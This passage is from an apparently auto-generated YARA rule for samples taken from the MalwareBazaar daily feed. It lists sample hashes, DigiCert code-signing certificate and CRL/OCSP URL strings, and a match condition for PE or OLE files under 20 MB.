      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153"
      hash3 = "a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii
      $s2 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii
      $s3 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii
      $s4 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii
      $s5 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s6 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii
      $s7 = "http://ocsp.digicert.com0\\" fullword ascii
      $s8 = "http://ocsp.digicert.com0X" fullword ascii
      $s9 = "Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" fullword ascii
      $s10 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii
      $s11 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii
      $s12 = "Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0" fullword ascii
      $s13 = "DigiCert, Inc.1;09" fullword ascii
      $s14 = "DigiCert Trusted Root G40" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "]J<0\"0i3" fullword ascii /* Goodware String - occured 1 times */
      $s16 = "v=Y]Bv" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "DigiCert, Inc.1A0?" fullword ascii
      $s18 = "2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA" fullword ascii
      $s19 = "2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA0" fullword ascii
      $s20 = "8DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA10" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0xcfd0 ) and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}
